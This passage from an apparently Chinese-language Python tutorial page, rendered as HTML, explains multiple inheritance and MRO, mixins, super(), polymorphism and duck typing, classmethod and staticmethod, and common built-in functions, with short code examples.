<span class="hljs-comment"># &#x4E8C;&#xFF1A;&#x5982;&#x679C;&#x591A;&#x7EE7;&#x627F;&#x662F;&#x975E;&#x83F1;&#x5F62;&#x7EE7;&#x627F;&#xFF0C;&#x7ECF;&#x5178;&#x7C7B;&#x4E0E;&#x65B0;&#x5F0F;&#x7684;&#x5C5E;&#x6027;&#x67E5;&#x627E;&#x987A;&#x5E8F;&#x4E00;&#x6837;&#xFF1A;</span>
<span class="hljs-comment">#    &#x90FD;&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x652F;&#x4E00;&#x4E2A;&#x5206;&#x652F;&#x5730;&#x627E;&#x4E0B;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x6700;&#x540E;&#x627E;object</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from E&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from F&apos;</span>)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span><span class="hljs-params">(E)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from B&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span><span class="hljs-params">(F)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from C&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from D&apos;</span>)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span><span class="hljs-params">(B, C, D)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from A&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># &#x65B0;&#x5F0F;&#x7C7B;</span>
<span class="hljs-comment"># print(A.mro()) # A-&gt;B-&gt;E-&gt;C-&gt;F-&gt;D-&gt;object</span>

obj = A()
obj.test() <span class="hljs-comment"># &#x7ED3;&#x679C;&#x4E3A;&#xFF1A;from F</span>
</code></pre>
<p>&#x5982;&#x679C;&#x7EE7;&#x627F;&#x5173;&#x7CFB;&#x4E3A;&#x83F1;&#x5F62;&#x7ED3;&#x6784;&#xFF0C;&#x90A3;&#x4E48;&#x7ECF;&#x5178;&#x7C7B;&#x4E0E;&#x65B0;&#x5F0F;&#x7C7B;&#x4F1A;&#x6709;&#x4E0D;&#x540C;MRO&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x5C5E;&#x6027;&#x7684;&#x4E24;&#x79CD;&#x67E5;&#x627E;&#x65B9;&#x5F0F;&#xFF1A;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#x548C;&#x5E7F;&#x5EA6;&#x4F18;&#x5148;</p>
<p><a href="https://imgtu.com/i/bfrz90" target="_blank"><img src="https://s1.ax1x.com/2022/03/10/bfrz90.png" alt="bfrz90.png"></a></p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4E09;&#xFF1A;&#x5982;&#x679C;&#x591A;&#x7EE7;&#x627F;&#x662F;&#x83F1;&#x5F62;&#x7EE7;&#x627F;&#xFF0C;&#x7ECF;&#x5178;&#x7C7B;&#x4E0E;&#x65B0;&#x5F0F;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x67E5;&#x627E;&#x987A;&#x5E8F;&#x4E0D;&#x4E00;&#x6837;&#xFF1A;</span>
<span class="hljs-comment">#    &#x7ECF;&#x5178;&#x7C7B;&#xFF1A;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#xFF0C;&#x4F1A;&#x5728;&#x68C0;&#x7D22;&#x7B2C;&#x4E00;&#x6761;&#x5206;&#x652F;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x76F4;&#x63A5;&#x4E00;&#x6761;&#x9053;&#x8D70;&#x5230;&#x9ED1;&#xFF0C;&#x5373;&#x4F1A;&#x68C0;&#x7D22;&#x5927;&#x8111;&#x888B;&#xFF08;&#x5171;&#x540C;&#x7684;&#x7236;&#x7C7B;&#xFF09;</span>
<span class="hljs-comment">#    &#x65B0;&#x5F0F;&#x7C7B;&#xFF1A;&#x5E7F;&#x5EA6;&#x4F18;&#x5148;&#xFF0C;&#x4F1A;&#x5728;&#x68C0;&#x7D22;&#x6700;&#x540E;&#x4E00;&#x6761;&#x5206;&#x652F;&#x7684;&#x65F6;&#x5019;&#x68C0;&#x7D22;&#x5927;&#x8111;&#x888B;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G</span>:</span> <span class="hljs-comment"># &#x5728;python2&#x4E2D;&#xFF0C;&#x672A;&#x7EE7;&#x627F;object&#x7684;&#x7C7B;&#x53CA;&#x5176;&#x5B50;&#x7C7B;&#xFF0C;&#x90FD;&#x662F;&#x7ECF;&#x5178;&#x7C7B;</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from G&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span><span class="hljs-params">(G)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from E&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span><span class="hljs-params">(G)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from F&apos;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span><span class="hljs-params">(E)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from B&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span><span class="hljs-params">(F)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from C&apos;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span><span class="hljs-params">(G)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from D&apos;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span><span class="hljs-params">(B,C,D)</span>:</span>
    <span class="hljs-comment"># def test(self):</span>
    <span class="hljs-comment">#     print(&apos;from A&apos;)</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># &#x65B0;&#x5F0F;&#x7C7B;</span>
<span class="hljs-comment"># print(A.mro()) # A-&gt;B-&gt;E-&gt;C-&gt;F-&gt;D-&gt;G-&gt;object</span>

<span class="hljs-comment"># &#x7ECF;&#x5178;&#x7C7B;&#xFF1A;A-&gt;B-&gt;E-&gt;G-&gt;C-&gt;F-&gt;D</span>
obj = A()
obj.test() <span class="hljs-comment">#</span>

&#x7ECF;&#x5178;&#x7C7B;&#x6CA1;&#x6709;object&#x8FD9;&#x4E00;&#x4E2A;&#x4E1C;&#x897F;
</code></pre>
<h4 id="mixins&#x673A;&#x5236;">Mixins&#x673A;&#x5236;</h4>
<pre><code>&#x5C31;&#x662F;&#x5728;&#x591A;&#x7EE7;&#x627F;&#x80CC;&#x666F;&#x4E0B;&#x5C3D;&#x53EF;&#x80FD;&#x5730;&#x63D0;&#x5347;&#x591A;&#x7EE7;&#x627F;&#x7684;&#x53EF;&#x8BFB;&#x6027;
</code></pre><pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vehicle</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlyableMixin</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fly</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CivilAircraft</span><span class="hljs-params">(FlyableMixin,Vehicle)</span>:</span>  <span class="hljs-comment"># &#x6C11;&#x822A;&#x98DE;&#x673A;</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helicopter</span><span class="hljs-params">(FlyableMixin,Vehicle)</span>:</span>  <span class="hljs-comment"># &#x76F4;&#x5347;&#x98DE;&#x673A;</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Car</span><span class="hljs-params">(Vehicle)</span>:</span>  <span class="hljs-comment"># &#x6C7D;&#x8F66;&#x5E76;&#x4E0D;&#x4F1A;&#x98DE;&#xFF0C;&#x4F46;&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x7EE7;&#x627F;&#x5173;&#x7CFB;&#xFF0C;&#x6C7D;&#x8F66;&#x4E5F;&#x80FD;&#x98DE;&#x4E86;</span>
    <span class="hljs-keyword">pass</span>


<span class="hljs-keyword">import</span> socketserver
<span class="hljs-comment"># &#x8865;&#x5145;&#xFF1A;&#x901A;&#x5E38;Mixin&#x7ED3;&#x679C;&#x7684;&#x7C7B;&#x653E;&#x5728;&#x5DE6;&#x8FB9;</span>
</code></pre>
<h5 id="&#x5728;&#x5B50;&#x7C7B;&#x6D3E;&#x751F;&#x7684;&#x65B0;&#x65B9;&#x6CD5;&#x4E2D;&#x91CD;&#x7528;&#x7236;&#x7C7B;&#x529F;&#x80FD;">&#x5728;&#x5B50;&#x7C7B;&#x6D3E;&#x751F;&#x7684;&#x65B0;&#x65B9;&#x6CD5;&#x4E2D;&#x91CD;&#x7528;&#x7236;&#x7C7B;&#x529F;&#x80FD;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5728;&#x5B50;&#x7C7B;&#x6D3E;&#x751F;&#x7684;&#x65B0;&#x65B9;&#x6CD5;&#x4E2D;&#x5982;&#x4F55;&#x91CD;&#x7528;&#x7236;&#x7C7B;&#x7684;&#x529F;&#x80FD;</span>
<span class="hljs-comment"># &#x65B9;&#x5F0F;&#x4E00;&#xFF1A;&#x6307;&#x540D;&#x9053;&#x59D3;&#x8C03;&#x7528;&#x67D0;&#x4E00;&#x4E2A;&#x7C7B;&#x4E0B;&#x7684;&#x51FD;&#x6570;=&#x300B;&#x4E0D;&#x4F9D;&#x8D56;&#x4E8E;&#x7EE7;&#x627F;&#x5173;&#x7CFB;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OldboyPeople</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age,sex)</span>:</span>
        self.name=name
        self.age=age
        self.sex=sex

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s say hello&apos;</span> %self.name)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Teacher</span><span class="hljs-params">(OldboyPeople)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age,sex,level,salary)</span>:</span>
        OldboyPeople.__init__(self,name,age,sex)

        self.level = level
        self.salary=salary

tea_obj=Teacher(<span class="hljs-string">&apos;egon&apos;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&apos;male&apos;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3000</span>)
print(tea_obj.__dict__)

<span class="hljs-comment"># &#x65B9;&#x5F0F;&#x4E8C;&#xFF1A;super()&#x8C03;&#x7528;&#x7236;&#x7C7B;&#x63D0;&#x4F9B;&#x7ED9;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;=&#x300B;&#x4E25;&#x683C;&#x4F9D;&#x8D56;&#x7EE7;&#x627F;&#x5173;&#x7CFB;</span>
<span class="hljs-comment"># &#x8C03;&#x7528;super()&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x8BE5;&#x5BF9;&#x8C61;&#x4F1A;&#x53C2;&#x7167;&#x53D1;&#x8D77;&#x5C5E;&#x6027;&#x67E5;&#x627E;&#x7684;&#x90A3;&#x4E2A;&#x7C7B;&#x7684;mro,&#x53BB;&#x5F53;&#x524D;&#x7C7B;&#x7684;&#x7236;&#x7C7B;&#x4E2D;&#x627E;&#x5C5E;&#x6027;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OldboyPeople</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age,sex)</span>:</span>
        self.name=name
        self.age=age
        self.sex=sex

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s say hello&apos;</span> %self.name)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Teacher</span><span class="hljs-params">(OldboyPeople)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age,sex,level,salary)</span>:</span>
        <span class="hljs-comment"># super(Teacher,self).__init__(name,age,sex)</span>
        super().__init__(name,age,sex) <span class="hljs-comment"># &#x8C03;&#x7528;&#x7684;&#x662F;&#x65B9;&#x6CD5;&#xFF0C;&#x81EA;&#x52A8;&#x4F20;&#x5165;&#x5BF9;&#x8C61;</span>

        self.level = level
        self.salary=salary

<span class="hljs-comment"># print(Teacher.mro())</span>
tea_obj=Teacher(<span class="hljs-string">&apos;egon&apos;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&apos;male&apos;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3000</span>)
print(tea_obj.__dict__)
</code></pre>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from A&apos;</span>)
        super().test1()

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from B&apos;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span><span class="hljs-params">(A,B)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test1</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;from C&apos;</span>)

obj=C()
obj.test()

print(C.mro())
</code></pre>
<h5 id="&#x591A;&#x6001;">&#x591A;&#x6001;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># 1&#x3001;&#x4EC0;&#x4E48;&#x591A;&#x6001;&#xFF1A;&#x540C;&#x4E00;&#x4E8B;&#x7269;&#x6709;&#x591A;&#x79CD;&#x5F62;&#x6001;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span><span class="hljs-params">(Animal)</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span><span class="hljs-params">(Animal)</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pig</span><span class="hljs-params">(Animal)</span>:</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x4F55;&#x8981;&#x6709;&#x591A;&#x6001;=&#x300B;&#x591A;&#x6001;&#x4F1A;&#x5E26;&#x6765;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x591A;&#x6001;&#x6027;</span>
<span class="hljs-comment">#    &#x591A;&#x6001;&#x6027;&#x6307;&#x7684;&#x662F;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x8003;&#x8651;&#x5BF9;&#x8C61;&#x5177;&#x4F53;&#x7C7B;&#x578B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x800C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5BF9;&#x8C61;</span>

print(<span class="hljs-string">&apos;hello&apos;</span>.__len__())
print([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>].__len__())
print({<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&apos;b&apos;</span>:<span class="hljs-number">2</span>}.__len__())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_len</span><span class="hljs-params">(val)</span>:</span>
    <span class="hljs-keyword">return</span> val.__len__()

print(my_len(<span class="hljs-string">&apos;hello&apos;</span>))
print(my_len([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]))
print(my_len({<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&apos;b&apos;</span>:<span class="hljs-number">2</span>}))
</code></pre>
<h6 id="&#x9E2D;&#x5B50;&#x7C7B;&#x578B;">&#x9E2D;&#x5B50;&#x7C7B;&#x578B;</h6>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cpu</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;cpu read&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;cpu write&apos;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mem</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;mem read&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;mem write&apos;</span>)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Txt</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;txt read&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;txt write&apos;</span>)


obj1=Cpu()
obj2=Mem()
obj3=Txt()

obj1.read()
obj1.write()

obj2.read()
obj2.write()

obj3.read()
obj3.write()
</code></pre>
<h5 id="&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;&#x4E0E;&#x975E;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;">&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;&#x4E0E;&#x975E;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;</h5>
<p>@classmethod&#x548C;@staticmethod</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4E00;&#xFF1A;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;&#xFF1A;&#x7279;&#x6B8A;&#x4E4B;&#x5904;&#x5728;&#x4E8E;&#x5C06;&#x8C03;&#x7528;&#x8005;&#x672C;&#x8EAB;&#x5F53;&#x505A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x81EA;&#x52A8;&#x4F20;&#x5165;</span>
<span class="hljs-comment">#    1&#x3001;&#x7ED1;&#x5B9A;&#x7ED9;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;&#x8C03;&#x7528;&#x8005;&#x662F;&#x5BF9;&#x8C61;&#xFF0C;&#x81EA;&#x52A8;&#x4F20;&#x5165;&#x7684;&#x662F;&#x5BF9;&#x8C61;</span>
<span class="hljs-comment">#    2&#x3001;&#x7ED1;&#x5B9A;&#x7ED9;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;&#x8C03;&#x7528;&#x8005;&#x7C7B;&#xFF0C;&#x81EA;&#x52A8;&#x4F20;&#x5165;&#x7684;&#x662F;&#x7C7B;</span>

<span class="hljs-keyword">import</span> settings

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mysql</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,ip,port)</span>:</span>
        self.ip=ip
        self.port=port

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s:%s&apos;</span> %(self.ip,self.port))

<span class="hljs-meta">    @classmethod # &#x5C06;&#x4E0B;&#x9762;&#x7684;&#x51FD;&#x6570;&#x88C5;&#x9970;&#x6210;&#x7ED1;&#x5B9A;&#x7ED9;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_conf</span><span class="hljs-params">(cls)</span>:</span>
        print(cls)
        <span class="hljs-keyword">return</span> cls(settings.IP, settings.PORT)

<span class="hljs-comment"># obj1=Mysql(&apos;1.1.1.1&apos;,3306)</span>

obj2=Mysql.from_conf()
print(obj2.__dict__)

<span class="hljs-comment"># &#x4E8C;&#xFF1A;&#x975E;&#x7ED1;&#x5B9A;&#x65B9;&#x6CD5;-&#x300B;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#xFF1A;</span>
<span class="hljs-comment">#    &#x6CA1;&#x6709;&#x7ED1;&#x5B9A;&#x7ED9;&#x4EFB;&#x4F55;&#x4EBA;&#xFF1A;&#x8C03;&#x7528;&#x8005;&#x53EF;&#x4EE5;&#x662F;&#x7C7B;&#x3001;&#x5BF9;&#x8C61;&#xFF0C;&#x6CA1;&#x6709;&#x81EA;&#x52A8;&#x4F20;&#x53C2;&#x7684;&#x6548;&#x679C;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mysql</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,ip,port)</span>:</span>
        self.nid=self.create_id()
        self.ip=ip
        self.port=port

<span class="hljs-meta">    @staticmethod # &#x5C06;&#x4E0B;&#x8FF0;&#x51FD;&#x6570;&#x88C5;&#x9970;&#x6210;&#x4E00;&#x4E2A;&#x9759;&#x6001;&#x65B9;&#x6CD5;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_id</span><span class="hljs-params">()</span>:</span>
        <span class="hljs-keyword">import</span> uuid
        <span class="hljs-keyword">return</span> uuid.uuid4()

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(cls)</span>:</span>
        <span class="hljs-keyword">pass</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">pass</span>
obj1=Mysql(<span class="hljs-string">&apos;1.1.1.1&apos;</span>,<span class="hljs-number">3306</span>)

print(Mysql.create_id)
print(Mysql.f1)
print(obj1.f2)
</code></pre>
<h5 id="&#x5185;&#x7F6E;&#x51FD;&#x6570;">&#x5185;&#x7F6E;&#x51FD;&#x6570;</h5>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x53D6;&#x7EDD;&#x5BF9;&#x503C;</span>
print(abs(<span class="hljs-number">-1</span>))
<span class="hljs-comment">#    &#x6240;&#x6709;&#x7684;&#x503C;&#x53D6;&#x51FA;&#x6765;&#x505A;&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x503C;&#x90FD;&#x4E3A;true&#x7ED3;&#x679C;&#x624D;&#x4E3A;true        &#x5982;&#x679C;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;&#x4E3A;&#x7A7A;&#x8FD4;&#x56DE;true</span>
print(all([<span class="hljs-number">1</span>,<span class="hljs-string">&apos;aaa&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>]))                                        print(all([]))
<span class="hljs-comment">#    &#x6240;&#x6709;&#x7684;&#x503C;&#x53D6;&#x51FA;&#x6765;&#x505A;&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x503C;&#x90FD;&#x4E3A;false&#x7ED3;&#x679C;&#x624D;&#x4E3A;false    &#x5982;&#x679C;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;&#x4E3A;&#x7A7A;&#x8FD4;&#x56DE;false</span>
print(any([<span class="hljs-number">0</span>,<span class="hljs-keyword">None</span>,<span class="hljs-number">1</span>]))                                            print(any([]))
<span class="hljs-comment">#    &#x8FDB;&#x5236;&#x8F6C;&#x6362;&#xFF1A;bin&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#xFF0C;oct&#x662F;&#x516B;&#x8FDB;&#x5236;&#xFF0C;hex&#x662F;&#x5341;&#x516D;&#x8FDB;&#x5236;</span>
print(bin(<span class="hljs-number">11</span>))
print(oct(<span class="hljs-number">11</span>))
print(hex(<span class="hljs-number">11</span>))
<span class="hljs-comment">#    &#x7528;&#x6765;&#x5224;&#x65AD;&#x67D0;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x6216;&#x8005;&#x7C7B;&#xFF0C;&#x6216;&#x8005;&#x51FD;&#x6570;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x88AB;&#x8C03;&#x7528;</span>
print(callable(Foo)) 
<span class="hljs-comment">#    ord&#x628A;&#x5B57;&#x7B26;&#x8F6C;ascii&#x6570;&#x5B57;&#xFF0C;chr&#x662F;ascii&#x7801;&#x8F6C;&#x5B57;&#x7B26;</span>
print(chr(<span class="hljs-number">65</span>))
print(ord(<span class="hljs-string">&apos;A&apos;</span>))
<span class="hljs-comment">#    dir()    &#x67E5;&#x770B;&#x5BF9;&#x5E94;&#x7684;&#x4E0B;&#x9762;&#x6709;&#x54EA;&#x4E9B;&#x5C5E;&#x6027;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span>:</span>
  <span class="hljs-keyword">pass</span>
obj = Foo()
print(dir(obj))
<span class="hljs-comment">#    divmod&#x53EF;&#x4EE5;&#x7B97;&#x51FA;&#x5546;&#x548C;&#x4F59;&#x6570;</span>
print(divmod(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>))
<span class="hljs-comment">#    enumerate&#x65E2;&#x62FF;&#x5230;&#x7D22;&#x5F15;&#xFF0C;&#x4E5F;&#x62FF;&#x5230;&#x503C;</span>
<span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> enumerate([<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>]):
    print(i,v)
<span class="hljs-comment">#    &#x6267;&#x884C;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684;&#x8868;&#x8FBE;&#x5F0F;</span>
res=eval(<span class="hljs-string">&apos;{&quot;a&quot;:1}&apos;</span>) 
print(res,type(res))
<span class="hljs-comment"># &#x4E0D;&#x53EF;&#x53D8;&#x96C6;&#x5408;</span>
s=frozenset({<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>})
<span class="hljs-comment"># &#x7C7B;&#x578B;&#x5224;&#x65AD;&#x63A8;&#x8350;&#x4F7F;&#x7528;isinstance</span>
print(isinstance([],list)) 
<span class="hljs-comment">#    10&#x7684;&#x5E73;&#x65B9;&#x518D;&#x5BF9;3&#x53D6;&#x4F59;&#x6570;</span>
print(pow(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))
<span class="hljs-comment">#    slice&#x5207;&#x7247;</span>
s=slice(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>)
l1=[<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>]
l2=[<span class="hljs-string">&apos;aaa&apos;</span>,<span class="hljs-string">&apos;bbb&apos;</span>,<span class="hljs-string">&apos;ccc&apos;</span>,<span class="hljs-string">&apos;ddd&apos;</span>,<span class="hljs-number">444</span>]

